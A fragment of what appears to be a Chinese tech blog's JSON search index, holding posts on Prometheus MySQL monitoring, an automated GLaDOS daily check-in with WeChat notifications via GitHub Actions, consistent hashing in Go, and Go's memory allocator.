\nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n+ 启动\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable mysqld_exporter\nsudo systemctl start mysqld_exporter\nsudo systemctl status mysqld_exporter\n```\n\n+ prometheus配置文件中加入mysql监控并重启：\n\n```\nsudo vi /opt/prometheus/prometheus.yml\n```\n\n```\n  - job_name: 'mysqld-node'\n    static_configs:\n    - targets: ['127.0.0.1:9104']\n```\n\n+ 重启服务\n\n```\nsudo systemctl restart prometheus\n```\n\n\n\n+ 添加模板编号 7362\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220216144528572.jpg\" alt=\"image-20220216144528572\" style=\"zoom:50%;\" />\n\n\n\n\n# 4. 参考资料\n\n+ https://www.iuskye.com/2021/03/30/prom-s1.html\n+ https://www.iuskye.com/2021/04/07/prom-s2.html\n+ https://www.iuskye.com/2021/05/07/prom-s3.html\n+ https://www.jianshu.com/p/967cb76cd5ca","tags":["prometheus"],"categories":["软件"]},{"title":"glados每日签到并发送微信通知","url":"%2Fp%2Fd6b582c3.html","content":"\n通过Github Action自动定时运行`checkin.py`脚本，每日进行GLaDOS的签到，并发送通知到自己的微信上。\n\n# 1. 准备工作\n\n### 1.1 github action\n\n+ 通过Github Action自动定时运行`checkin.py`脚本。\n\n+ 登录GLaDOS后获取cookies。（简单获取方法：浏览器快捷键F12，打开调试窗口，点击“network”获取）\n+ 然后通过“Server酱”（http://sc.ftqq.com/3.version)，自动发通知到微信上。\n\n+ 可以发送到自己的企业微信\n\n<!-- more -->\n\n## 1.2 企业微信\n\nWecom酱是通过企业微信推送消息到微信的消息推送函数和在线服务方案，开源免费，可自己搭建。支持多语言。\n\n优点：\n\n1. 一次配置，持续使用\n2. 配置好以后，只需要微信就能收消息，不再需要安装企业微信客户端\n3. 消息接口无需认证即可使用，个人用微信就可以注册\n\n##### 1.2.1 操作流程 \n\n+ 用电脑打开[企业微信官网](https://work.weixin.qq.com/)，注册一个企业\n+ 注册成功后，点「管理企业」进入管理界面，选择「应用管理」 → 「自建」 → 「创建应用」\n+ 创建完成后进入应用详情页，可以得到应用ID( `agentid` )①，应用Secret( `secret` )②。注意：`secret`推送到手机端时，只能在`企业微信客户端`中查看。\n+ 进入「[我的企业](https://work.weixin.qq.com/wework_admin/frame#profile)」页面，拉到最下边，可以看到企业ID③，复制并填到上方。\n+ 进入「我的企业」 → 「[微信插件](https://work.weixin.qq.com/wework_admin/frame#profile/wxPlugin)」，拉到下边扫描二维码，关注以后即可收到推送的消息。\n+ 进入「我的企业」 → 「[微信插件](https://work.weixin.qq.com/wework_admin/frame#profile/wxPlugin)」，拉到最下方，勾选 “允许成员在微信插件中接收和回复聊天消息” \n+ 在企业微信客户端 「我」 → 「设置」 → 「新消息通知」中关闭 “仅在企业微信中接受消息” 限制条件\n\n\n\n# 2. workflow\n\n### 2.1 checkin.yml\n\n```yml\nname: glados-checkin\n\non:\n  workflow_dispatch: \n  push:\n    branches: [ master ]\n  pull_request:\n    branches: [ master ]\n  schedule:\n    - cron:  0 10,16 * * * \n      # \n      # https://tool.lu/crontab/\n      # https://datetime360.com/cn/utc-cst-china-time/\n  #watch:\n  #    types: started   \n\njobs:\n  checkin:\n    runs-on: ubuntu-latest\n    #if: github.event.repository.owner.id == github.event.sender.id\n    # https://p3terx.com/archives/github-actions-manual-trigger.html\n    \n    steps:\n    - uses: actions/checkout@v2\n\n    - name: Install Python\n      run: |\n        sudo apt update && \\\n        sudo apt install python3\n      \n    - name: requirements\n      run: |\n        pip3 install -r requirements.txt\n       # if [ -f requirements.txt ]; then pip install -r requirements.txt; fi \n    - name: Checkin\n      run: |\n        python3 checkin.py \n      env: \n        WECHAT_SECRET: ${{ secrets.WECHAT_SECRET }}\n        SERVE: ${{ secrets.SERVE }}\n        SCKEY: ${{ secrets.SCKEY }}\n        COOKIE: ${{ secrets.COOKIE }}\n```\n\n\n\n### 2.2 checkin.py\n\n```python\nimport json,requests,json,os\n\n# server酱开关，填off不开启(默认)，填on同时开启cookie失效通知和签到成功通知\nsever = os.environ[\"SERVE\"]\n# 填写server酱sckey,不开启server酱则不用填\nsckey = os.environ[\"SCKEY\"]\n# 填入glados账号对应cookie\ncookie = os.environ[\"COOKIE\"]\n# 企业微信的密钥\nwsecret = os.environ[\"WECHAT_SECRET\"]\n\n\ndef send_to_wecom(text,wecom_cid,wecom_aid,wecom_secret,wecom_touid='@all'):\n    get_token_url = f\"https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid={wecom_cid}&corpsecret={wecom_secret}\"\n    response = requests.get(get_token_url).content\n    access_token = json.loads(response).get('access_token')\n    if access_token and len(access_token) > 0:\n        send_msg_url = f'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token={access_token}'\n        data = {\n            \"touser\":wecom_touid,\n            \"agentid\":wecom_aid,\n            \"msgtype\":\"text\",\n            \"text\":{\n                \"content\":text\n            },\n            \"duplicate_check_interval\":600\n        }\n        response = requests.post(send_msg_url,data=json.dumps(data)).content\n        return response\n    else:\n        return False\n\ndef send_to_wecom_image(base64_content,wecom_cid,wecom_aid,wecom_secret,wecom_touid='@all'):\n    get_token_url = f\"https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid={wecom_cid}&corpsecret={wecom_secret}\"\n    response = requests.get(get_token_url).content\n    access_token = json.loads(response).get('access_token')\n    if access_token and len(access_token) > 0:\n        upload_url = f'https://qyapi.weixin.qq.com/cgi-bin/media/upload?access_token={access_token}&type=image'\n        upload_response = requests.post(upload_url, files={\n            \"picture\": base64.b64decode(base64_content)\n        }).json()\n        if \"media_id\" in upload_response:\n            media_id = upload_response['media_id']\n        else:\n            return False\n\n        send_msg_url = f'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token={access_token}'\n        data = {\n            \"touser\":wecom_touid,\n            \"agentid\":wecom_aid,\n            \"msgtype\":\"image\",\n            \"image\":{\n                \"media_id\": media_id\n            },\n            \"duplicate_check_interval\":600\n        }\n        response = requests.post(send_msg_url,data=json.dumps(data)).content\n        return response\n    else:\n        return False\n\ndef send_to_wecom_markdown(text,wecom_cid,wecom_aid,wecom_secret,wecom_touid='@all'):\n    get_token_url = f\"https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid={wecom_cid}&corpsecret={wecom_secret}\"\n    response = requests.get(get_token_url).content\n    access_token = json.loads(response).get('access_token')\n    if access_token and len(access_token) > 0:\n        send_msg_url = f'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token={access_token}'\n        data = {\n            \"touser\":wecom_touid,\n            \"agentid\":wecom_aid,\n            \"msgtype\":\"markdown\",\n            \"markdown\":{\n                \"content\":text\n            },\n            \"duplicate_check_interval\":600\n        }\n        response = requests.post(send_msg_url,data=json.dumps(data)).content\n        return response\n    else:\n        return False\n\n\ndef start():\n    url= \"https://glados.rocks/api/user/checkin\"\n    url2= \"https://glados.rocks/api/user/status\"\n    url3= \"https://glados.rocks/api/user/traffic\"\n    referer = 'https://glados.rocks/console/checkin'\n    origin = \"https://glados.rocks\"\n    useragent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36\"\n    payload={\n        'token': 'glados_network'\n    }\n    checkin = requests.post(url,headers={'cookie': cookie ,'referer': referer,'origin':origin,'user-agent':useragent,'content-type':'application/json;charset=UTF-8'},data=json.dumps(payload))\n    state =  requests.get(url2,headers={'cookie': cookie ,'referer': referer,'origin':origin,'user-agent':useragent})\n    traffic =  requests.get(url3,headers={'cookie': cookie ,'referer': referer,'origin':origin,'user-agent':useragent})\n    today = traffic.json()['data']['today']\n    str = \"cookie过期\"\n    if 'message' in checkin.text:\n        mess = checkin.json()['message']\n        time = state.json()['data']['leftDays']\n        time = time.split('.')[0]\n        str = '[pro] %s , you have %s days left. use: %.3f G' % (mess, time,today/1024/1024/1024)\n        if sever == '1' or sever == 'on':\n            requests.get('https://sc.ftqq.com/' + sckey + '.send?text='+str)\n    else:\n        requests.get('https://sc.ftqq.com/' + sckey + '.send?text='+str)\n\t\t\n    ret = send_to_wecom(str, \"wwc216d22335b2bb48\", \"1000002\", wsecret) # 换成自己的企业微信id\n    print(str, ret)\n\ndef main_handler(event, context):\n    return start()\n\nif __name__ == '__main__':\n    start()\n```\n\n\n\n### 2.3 设置仓库私有变量\n<img src=\"glados每日签到并发送微信通知/1.png\" alt=\"image-20220210222931325\" style=\"zoom:50%;\" />\n\n- COOKIE（Glados的cookie, 必填）\n- SERVE（server酱开关，默认是off，填on的话，会同时开启cookie失效通知和签到成功通知）\n- SCKEY（填写server酱sckey，不开启server酱则不用填）\n- WECHAT_SECRET（自己企业微信的密钥）\n\n\n\n# 3. 参考资料\n\n+ https://github.com/unix2dos/glados-checkin-1\n\n+ https://github.com/easychen/wecomchan","tags":["glados"],"categories":["使用软件"]},{"title":"一致性hash算法和golang实现","url":"%2Fp%2F15117917.html","content":"\n当系统容量增多时，就会将数据水平切分到不同的节点来存储，也就是将数据分布到了不同的节点。\n\n# 1. hash算法\n\n哈希算法最简单的做法就是进行取模运算，比如分布式系统中有 3 个节点，基于 `hash(key) % 3` 公式对数据进行了映射。\n\n但是有一个很致命的问题，如果节点数量发生了变化，也就是在对系统做扩容或者缩容时，必须迁移改变了映射关系的数据，否则会出现查询不到数据的问题。\n\n<img src=\"一致性hash算法和golang实现/ed14c96417e08b4f916e0cd23d12b7bd.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"一致性hash算法和golang实现/392c54cfb9ec47f5191008aa1d27d6b5.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n假设总数据条数为 M，哈希算法在面对节点数量变化时，最坏情况下所有数据都需要迁移，所以它的数据迁移规模是 O(M)，这样数据的迁移成本太高了。\n\n<!-- more -->\n\n# 2. 一致性hash算法\n\n一致哈希算法也用了取模运算，但与哈希算法不同的是，哈希算法是对节点的数量进行取模运算，而**一致哈希算法是对 2^32 进行取模运算，是一个固定的值**。\n\n我们可以把一致哈希算法是对 2^32 进行取模运算的结果值组织成一个圆环，就像钟表一样，钟表的圆可以理解成由 60 个点组成的圆，而此处我们把这个圆想象成由 2^32 个点组成的圆，这个圆环被称为哈希环，如下图：\n\n<img src=\"一致性hash算法和golang实现/0ea3960fef48d4cbaeb4bec4345301e7.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n一致性哈希要进行两步哈希：\n\n- 第一步：对存储节点进行哈希计算，也就是对存储节点做哈希映射，比如根据节点的 IP 地址进行哈希；\n- 第二步：当对数据进行存储或访问时，对数据进行哈希映射；\n\n所以，**一致性哈希是指将「存储节点」和「数据」都映射到一个首尾相连的哈希环上**。\n\n问题来了，对「数据」进行哈希映射得到一个结果要怎么找到存储该数据的节点呢？\n\n答案是，映射的结果值往顺时针的方向的找到第一个节点，就是存储该数据的节点。\n\n### 2.1 增删节点\n\n举个例子，有 3 个节点经过哈希计算，映射到了如下图的位置：\n\n<img src=\"一致性hash算法和golang实现/83d7f363643353c92d252e34f1d4f687.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n接着，对要查询的 key-01 进行哈希计算，确定此 key-01 映射在哈希环的位置，然后从这个位置往顺时针的方向找到第一个节点，就是存储该 key-01 数据的节点。\n\n比如，下图中的 key-01 映射的位置，往顺时针的方向找到第一个节点就是节点 A。\n\n<img src=\"一致性hash算法和golang实现/30c2c70721c12f9c140358fbdc5f2282.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n所以，当需要对指定 key 的值进行读写的时候，要通过下面 2 步进行寻址：\n\n+ 首先，对 key 进行哈希计算，确定此 key 在环上的位置；\n\n+ 然后，从这个位置沿着顺时针方向走，遇到的第一节点就是存储 key 的节点。\n\n知道了一致哈希寻址的方式，我们来看看，如果增加一个节点或者减少一个节点会发生大量的数据迁移吗？\n\n\n\n假设节点数量从 3 增加到了 4，新的节点 D 经过哈希计算后映射到了下图中的位置：\n\n<img src=\"一致性hash算法和golang实现/f8909edef2f3949f8945bb99380baab3.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n我们可以看到，key-01、key-03 都不受影响，只有 key-02 需要被迁移节点 D。\n\n\n\n假设节点数量从 3 减少到了 2，比如将节点 A 移除：\n\n<img src=\"一致性hash算法和golang实现/31485046f1303b57d8aaeaab103ea7ab.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n你可以看到，key-02 和 key-03 不会受到影响，只有 key-01 需要被迁移节点 B。\n\n因此，**在一致哈希算法中，如果增加或者移除一个节点，仅影响该节点在哈希环上顺时针相邻的后继节点，其它数据也不会受到影响**。\n\n\n\n### 2.2 均衡性\n\n但是一致性哈希算法并不保证节点能够在哈希环上分布均匀，这样就会带来一个问题，会有大量的请求集中在一个节点上。\n\n<img src=\"一致性hash算法和golang实现/d528bae6fcec2357ba2eb8f324ad9fd5.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n这时候有一半以上的数据的寻址都会找节点 A，也就是访问请求主要集中的节点 A 上，这肯定不行的呀，说好的负载均衡呢，这种情况一点都不均衡。\n\n比如，上图中如果节点 A 被移除了，当节点 A 宕机后，根据一致性哈希算法的规则，其上数据应该全部迁移到相邻的节点 B 上，这样，节点 B 的数据量、访问量都会迅速增加很多倍，一旦新增的压力超过了节点 B 的处理能力上限，就会导致节点 B 崩溃，进而形成雪崩式的连锁反应。\n\n所以，**一致性哈希算法虽然减少了数据迁移量，但是存在节点分布不均匀的问题**。\n\n但问题是，实际中我们没有那么多节点。所以这个时候我们就加入**虚拟节点**，也就是对一个真实节点做多个副本。\n\n具体做法是，不再将真实节点映射到哈希环上，而是将虚拟节点映射到哈希环上，并将虚拟节点映射到实际节点，所以这里有「两层」映射关系。\n\n比如对每个节点分别设置 3 个虚拟节点：\n\n- 对节点 A 加上编号来作为虚拟节点：A-01、A-02、A-03\n- 对节点 B 加上编号来作为虚拟节点：B-01、B-02、B-03\n- 对节点 C 加上编号来作为虚拟节点：C-01、C-02、C-03\n\n引入虚拟节点后，原本哈希环上只有 3 个节点的情况，就会变成有 9 个虚拟节点映射到哈希环上，哈希环上的节点数量多了 3 倍。\n\n<img src=\"一致性hash算法和golang实现/dbb57b8d6071d011d05eeadd93269e13.png\" alt=\"img\" style=\"zoom: 50%;\" />\n\n你可以看到，节点数量多了后，节点在哈希环上的分布就相对均匀了。这时候，如果有访问请求寻址到「A-01」这个虚拟节点，接着再通过「A-01」虚拟节点找到真实节点 A，这样请求就能访问到真实节点 A 了。\n\n上面为了方便你理解，每个真实节点仅包含 3 个虚拟节点，这样能起到的均衡效果其实很有限。而在实际的工程中，虚拟节点的数量会大很多，比如 Nginx 的一致性哈希算法，每个权重为 1 的真实节点就含有160 个虚拟节点。\n\n比如，当某个节点被移除时，对应该节点的多个虚拟节点均会移除，而这些虚拟节点按顺时针方向的下一个虚拟节点，可能会对应不同的真实节点，即这些不同的真实节点共同分担了节点变化导致的压力。\n\n# 3. golang实现\n\nhttps://github.com/golang/groupcache/blob/master/consistenthash/consistenthash.go\n\n```go\npackage consistenthash\n\nimport (\n\t\"hash/crc32\"\n\t\"sort\"\n\t\"strconv\"\n)\n\ntype Hash func(data []byte) uint32\n\ntype Map struct {\n\thash     Hash\n\treplicas int   // 虚拟节点多少个备份\n\tkeys     []int // Sorted\n\thashMap  map[int]string\n}\n\nfunc New(replicas int, fn Hash) *Map {\n\tm := &Map{\n\t\treplicas: replicas,\n\t\thash:     fn,\n\t\thashMap:  make(map[int]string),\n\t}\n\tif m.hash == nil {\n\t\tm.hash = crc32.ChecksumIEEE\n\t}\n\treturn m\n}\n\n// IsEmpty returns true if there are no items available.\nfunc (m *Map) IsEmpty() bool {\n\treturn len(m.keys) == 0\n}\n\n// Add adds some keys to the hash.\nfunc (m *Map) Add(keys ...string) {\n\tfor _, key := range keys {\n\t\tfor i := 0; i < m.replicas; i++ {\n\t\t\thash := int(m.hash([]byte(strconv.Itoa(i) + key)))\n\t\t\tm.keys = append(m.keys, hash)\n\t\t\tm.hashMap[hash] = key\n\t\t}\n\t}\n\tsort.Ints(m.keys)\n}\n\n// Get gets the closest item in the hash to the provided key.\nfunc (m *Map) Get(key string) string {\n\tif m.IsEmpty() {\n\t\treturn \"\"\n\t}\n\n\thash := int(m.hash([]byte(key)))\n\n\t// Binary search for appropriate replica.\n\tidx := sort.Search(len(m.keys), func(i int) bool { return m.keys[i] >= hash })\n\n\t// Means we have cycled back to the first replica.\n\tif idx == len(m.keys) {\n\t\tidx = 0\n\t}\n\n\treturn m.hashMap[m.keys[idx]]\n}\n```\n\nhttps://github.com/golang/groupcache/blob/master/consistenthash/consistenthash_test.go\n\n```go\nfunc TestHashing(t *testing.T) {\n\n\t// Override the hash function to return easier to reason about values. Assumes\n\t// the keys can be converted to an integer.\n\thash := New(3, func(key []byte) uint32 {\n\t\ti, err := strconv.Atoi(string(key))\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\treturn uint32(i)\n\t})\n\n\t// Given the above hash function, this will give replicas with \"hashes\":\n\t// 2, 4, 6, 12, 14, 16, 22, 24, 26\n\thash.Add(\"6\", \"4\", \"2\")\n\n\ttestCases := map[string]string{\n\t\t\"2\":  \"2\",\n\t\t\"11\": \"2\",\n\t\t\"23\": \"4\",\n\t\t\"27\": \"2\",\n\t}\n\n\tfor k, v := range testCases {\n\t\tif hash.Get(k) != v {\n\t\t\tt.Errorf(\"Asking for %s, should have yielded %s\", k, v)\n\t\t}\n\t}\n\n\t// Adds 8, 18, 28\n\thash.Add(\"8\")\n\n\t// 27 should now map to 8.\n\ttestCases[\"27\"] = \"8\"\n\n\tfor k, v := range testCases {\n\t\tif hash.Get(k) != v {\n\t\t\tt.Errorf(\"Asking for %s, should have yielded %s\", k, v)\n\t\t}\n\t}\n\n}\n```\n\n# 4. 总结\n\n+ 轮询这类的策略只能适用与每个节点的数据都是相同的场景，访问任意节点都能请求到数据。但是不适用分布式系统，因为分布式系统意味着数据水平切分到了不同的节点上，访问数据的时候，一定要寻址存储该数据的节点。\n+ 哈希算法虽然能建立数据和节点的映射关系，但是每次在节点数量发生变化的时候，最坏情况下所有数据都需要迁移，这样太麻烦了，所以不适用节点数量变化的场景。\n+ 一致性哈希是指将「存储节点」和「数据」都映射到一个首尾相连的哈希环上，如果增加或者移除一个节点，仅影响该节点在哈希环上顺时针相邻的后继节点，其它数据也不会受到影响。\n+ 为了解决一致性哈希算法不能够均匀的分布节点的问题，就需要引入虚拟节点，对一个真实节点做多个副本。不再将真实节点映射到哈希环上，而是将虚拟节点映射到哈希环上，并将虚拟节点映射到实际节点，所以这里有「两层」映射关系。\n\n# 5. 参考资料 \n\n+ https://www.xiaolincoding.com/os/8_network_system/hash.html\n+ https://github.com/golang/groupcache/blob/master/consistenthash/consistenthash.go\n","tags":["分布式"],"categories":["分布式"]},{"title":"golang内存管理和分配机制","url":"%2Fp%2Fbfcff60d.html","content":"\n# 1. 基础\n\n### 1.1 进程的虚拟内存\n\n程序运行进程的总大小可以超过实际可用的物理内存的大小。每个进程都可以有自己独立的虚拟地址空间。然后通过CPU和MMU把虚拟内存地址转换为实际物理地址。\n\n<img src=\"golang内存管理和分配机制/1.png\" alt=\"0\" style=\"zoom:80%;\" />\n\n<!-- more -->\n\n最高位的1GB是linux内核空间，用户代码不能写，否则触发段错误。下面的3GB是进程使用的内存。\n\n+ Kernel space：linux内核空间内存\n+ Stack：进程栈空间，程序运行时使用。它向下增长，系统自动管理\n+ Memory Mapping Segment：内存映射区，通过mmap系统调用，将文件映射到进程的地址空间，或者匿名映射。\n+ Heap：堆空间。这个就是程序里动态分配的空间。linux下使用malloc调用扩展（用brk/sbrk扩展内存空间），free函数释放（也就是缩减内存空间）\n+ BSS段：包含未初始化的静态变量和全局变量\n+ Data段：代码里已初始化的静态变量、全局变量\n+ Text段：代码段，进程的可执行文件\n\n\n\n### 1.2 golang内存逃逸分析\n\nC/C++，我们使用 malloc 或者 new 申请的变量会被分配到堆上。但是 Golang 并不是这样，虽然 Golang 语言里面也有 new。Golang 编译器决定变量应该分配到什么地方时会进行逃逸分析。下面是一个简单的例子。\n\n```go\npackage main\n\nimport ()\n\nfunc foo() *int {\n    var x int\n    return &x\n}\n\nfunc bar() int {\n    x := new(int)\n    *x = 1\n    return *x\n}\n\nfunc main() {}\n```\n\n将上面文件保存为 main.go，执行下面命令\n\n```bash\n$ go run -gcflags '-m -l' main.go\n\n# command-line-arguments\n./main.go:4:6: moved to heap: x\n./main.go:9:10: new(int) does not escape\n```\n\n\n上面的意思是 foo() 中的 x 最后在堆上分配，而 bar() 中的 x 最后分配在了栈上。\n\n\n如何得知变量是分配在栈（stack）上还是堆（heap）上？准确地说，你并不需要知道。Golang 中的变量只要被引用就一直会存活，存储在堆上还是栈上由内部实现决定而和具体的语法没有关系。\n\n# 2. golang内存管理\n\n### 2.1 TCMalloc算法\n\nGolang运行时的内存分配算法主要源自 Google 为 C 语言开发的 TCMalloc 算法，全称Thread-Caching Malloc。\n\n核心思想就是把内存分为多级管理，从而降低锁的粒度。它将可用的堆内存采用二级分配的方式进行管理：每个线程都会自行维护一个独立的内存池，进行内存分配时优先从该内存池中分配，当内存池不足时才会向全局内存池申请，以避免不同线程对全局内存池的频繁竞争。\n\n![1](golang内存管理和分配机制/4.png)\n\n\n\n### 2.2 内存管理单元mspan\n\nGo默认采用8192B(8KB)大小的页，页的粒度保持为8KB。\n\n但是有的变量很小就是数字，有的却是一个复杂的结构体，所以基于TCMalloc模型的Go还将内存页分为67个不同大小级别，从8字节到32KB分了67 种( 8 byte, 16 byte....32KB）。\n\n例如下图, 将8 KB页 划分为1KB的大小等级。\n\n![img{512x368}](golang内存管理和分配机制/3.png)\n\n\n\n`mspan`：Go中内存管理的基本单元，是一个双向链表对象，其中包含页面的起始地址，它具有的页面的span类以及它包含的页面数。\n\n```go\n// path: /usr/local/go/src/runtime/mheap.go\n\ntype mspan struct {\n   \n    next *mspan  //链表后向指针，用于将span链接起来\n   \n    prev *mspan   //链表前向指针，用于将span链接起来\n \n    startAddr uintptr  // 起始地址，也即所管理页的地址\n  \n    npages uintptr    // 管理的页数\n \n    nelems uintptr    // 块个数，表示有多少个块可供分配\n\n   \n    allocBits *gcBits  //分配位图，每一位代表一个块是否已分配\n\n    \n    allocCount uint16 // 已分配块的个数\n \n    spanclass spanClass     // class表中的class ID，和Size Classs相关\n\n\n    elemsize uintptr     // class表中的对象大小，也即块大小\n}\n```\n\n### 2.3 GMP的 P 绑定一个 mcache\n\nmcache可以为golang中每个 Processor（GMP模型的P） 提供内存cache使用，每一个mcache的组成单位也是mspan。\n\n我们知道每个 Gorontine 的运行都是绑定到一个 P 上面，mcache 是每个 P 的 cache。这么做的好处是分配内存时不需要加锁。\n\n```go\n// Per-thread (in Go, per-P) cache for small objects.\n// No locking needed because it is per-thread (per-P).\ntype mcache struct {\n    // The following members are accessed on every malloc,\n    // so they are grouped here for better caching.\n    next_sample int32   // trigger heap sample after allocating this many bytes\n    local_scan  uintptr // bytes of scannable heap allocated\n\n    // 小对象分配器，小于 16 byte 的小对象都会通过 tiny 来分配。\n    tiny             uintptr\n    tinyoffset       uintptr\n    local_tinyallocs uintptr // number of tiny allocs not counted in other stats\n\n    // The rest is not accessed on every malloc.\n    alloc [_NumSizeClasses]*mspan // spans to allocate from\n\n    stackcache [_NumStackOrders]stackfreelist\n\n    // Local allocator stats, flushed during GC.\n    local_nlookup    uintptr                  // number of pointer lookups\n    local_largefree  uintptr                  // bytes freed for large objects (>maxsmallsize)\n    local_nlargefree uintptr                  // number of frees for large objects (>maxsmallsize)\n    local_nsmallfree [_NumSizeClasses]uintptr // number of frees for small objects (<=maxsmallsize)\n}\n```\n\n解释:\n```bash\nalloc [_NumSizeClasses]*mspan\n_NumSizeClasses = 67, 每个数组元素用来包含特定大小的块。67 种块大小为 0，8 byte, 16 byte....32KB\n\nvar class_to_size = [_NumSizeClasses]uint16{0, 8, 16, 32, 48, 64, 80, 96, 112, 128, 144, 160, 176, 192, 208, 224, 240, 256, 288, 320, 352, 384, 416, 448, 480, 512, 576, 640, 704, 768, 896, 1024, 1152, 1280, 1408, 1536, 1792, 2048, 2304, 2688, 3072, 3200, 3456, 4096, 4864, 5376, 6144, 6528, 6784, 6912, 8192, 9472, 9728, 10240, 10880, 12288, 13568, 14336, 16384, 18432, 19072, 20480, 21760, 24576, 27264, 28672, 32768}\n```\n\n\n\n例如: 申请32字节内存,  32b的这种`mspan`能满足需求，那么分配内存的时候就会给它分配一个32字节大小的`mspan`。\n\n![11](golang内存管理和分配机制/5.png)\n\n### 2.4 线程共享 mcentral\n\n当工作线程的`mcache`中没有合适（也就是特定大小的）的`mspan`时就会从`mcentral` 去获取。`mcentral`被所有的工作线程共同享有，存在多个`goroutine`竞争的情况，因此从`mcentral`获取资源时需要加锁。\n\nmcentral里有两个双向链表，一个链表表示还有空闲的mspan待分配，一个表示链表里的mspan都被分配了。\n\n```go\ntype mcentral struct {\n    lock      mutex\n    sizeclass int32\n    nonempty  mSpanList // list of spans with a free object, ie a nonempty free list\n    empty     mSpanList // list of spans with no free objects (or cached in an mcache)\n}\n\ntype mSpanList struct {\n    first *mspan\n    last  *mspan\n}\n\n```\n\n解释\n\n```bash\nsizeclass: 0 ~ _NumSizeClasses 之间的一个值。\nlock: 因为会有多个 P 过来竞争。\nnonempty: mspan 的双向链表，当前 mcentral 中可用的 mspan list。\nempty: 已经被使用的，可以认为是一种对所有 mspan 的 track。\n```\n\n`mcentral`里维护着两个双向链表，nonempty表示链表里还有空闲的`mspan`待分配。empty表示这条链表里的`mspan`都被分配了`object`。\n\n![12](golang内存管理和分配机制/6.png)\n\n`mcache`从`mcentral`获取和归还`mspan`的流程：\n\n- 获取 加锁；从`nonempty`链表找到一个可用的`mspan`；并将其从`nonempty`链表删除；将取出的`mspan`加入到`empty`链表；将`mspan`返回给工作线程；解锁。\n- 归还 加锁；将`mspan`从`empty`链表删除；将`mspan`加入到`nonempty`链表；解锁。\n\n\n\n### 2.5 大内存 mheap\n\nmheap负责大内存的分配。当mcentral内存不够时，可以向mheap申请。那mheap没有内存资源呢？跟tcmalloc一样，向OS操作系统申请。\n\n还有，大于32KB的内存，也是直接向mheap申请。\n\n<img src=\"golang内存管理和分配机制/38720_10.png\" alt=\"全局图\" style=\"zoom:70%;\" />\n\n```go\ntype mheap struct {\n    lock      mutex\n    free      [_MaxMHeapList]mSpanList // free lists of given length\n    freelarge mSpanList                // free lists length >= _MaxMHeapList\n    busy      [_MaxMHeapList]mSpanList // busy lists of large objects of given length\n    busylarge mSpanList                // busy lists of large objects length >= _MaxMHeapList\n    sweepgen  uint32                   // sweep generation, see comment in mspan\n    sweepdone uint32                   // all spans are swept\n\n   \n    allspans []*mspan // all spans out there\n    spans []*mspan\n    sweepSpans [2]gcSweepBuf\n\n    _ uint32 // align uint64 fields on 32-bit for atomics\n\n    // Proportional sweep\n    pagesInUse        uint64  // pages of spans in stats _MSpanInUse; R/W with mheap.lock\n    spanBytesAlloc    uint64  // bytes of spans allocated this cycle; updated atomically\n    pagesSwept        uint64  // pages swept this cycle; updated atomically\n    sweepPagesPerByte float64 // proportional sweep ratio; written with lock, read without\n    // TODO(austin): pagesInUse should be a uintptr, but the 386\n    // compiler can't 8-byte align fields.\n\n    // Malloc stats.\n    largefree  uint64                  // bytes freed for large objects (>maxsmallsize)\n    nlargefree uint64                  // number of frees for large objects (>maxsmallsize)\n    nsmallfree [_NumSizeClasses]uint64 // number of frees for small objects (<=maxsmallsize)\n\n    // range of addresses we might see in the heap\n    bitmap         uintptr // Points to one byte past the end of the bitmap\n    bitmap_mapped  uintptr\n    arena_start    uintptr\n    arena_used     uintptr // always mHeap_Map{Bits,Spans} before updating\n    arena_end      uintptr\n    arena_reserved bool\n\n    // central free lists for small size classes.\n    // the padding makes sure that the MCentrals are\n    // spaced CacheLineSize bytes apart, so that each MCentral.lock\n    // gets its own cache line.\n    central [_NumSizeClasses]struct {\n        mcentral mcentral\n        pad      [sys.CacheLineSize]byte\n    }\n\n    spanalloc             fixalloc // allocator for span*\n    cachealloc            fixalloc // allocator for mcache*\n    specialfinalizeralloc fixalloc // allocator for specialfinalizer*\n    specialprofilealloc   fixalloc // allocator for specialprofile*\n    speciallock           mutex    // lock for special record allocators.\n}\n\nvar mheap_ mheap  // mheap_ 是一个全局变量，会在系统初始化的时候初始化\n```\n\n`mheap`里的`arena` 区域是真正的堆区，运行时会将 `8KB` 看做一页，这些内存页中存储了所有在堆上初始化的对象。\n\n![12](golang内存管理和分配机制/2.png)\n\n# 3. golang内存分配\n\nGo内存管理的基本单元是mspan，每种mspan可以分配特定大小的object。\n\nmcache, mcentral, mheap是 Go 内存管理的三大组件， mcache 管理线程在本地缓存的 mspan；mcentral 管理全局的 mspan供所有线程使用；mheap管理 Go的所有动态分配内存。\n\n### 3.1 分配策略\n\n- Go在程序启动时，会向操作系统申请一大块内存，由`mheap`结构全局管理。\n\n- object size < 16 byte，使用 mcache 的小对象分配器 tiny 直接分配。 \n\n  object size > 16 byte && size <=32K byte 时，先使用 mcache 中对应的 size class 分配。\n\n  object size > 32K，则使用 mheap 直接分配。\n\n- 如果 mcache 对应的 size class 的 span 已经没有可用的块，则向 mcentral 请求。\n\n  如果 mcentral 也没有可用的块，则向 mheap 申请。\n\n  如果 mheap 也没有合适的 span，则想操作系统申请。\n\n<img src=\"golang内存管理和分配机制/128821054-6f48a32f-34a3-494c-aedc-d079ba782c1c.png\" alt=\"image\" style=\"zoom:50%;\" />\n\n### 3.2 头脑风暴\n\n+ 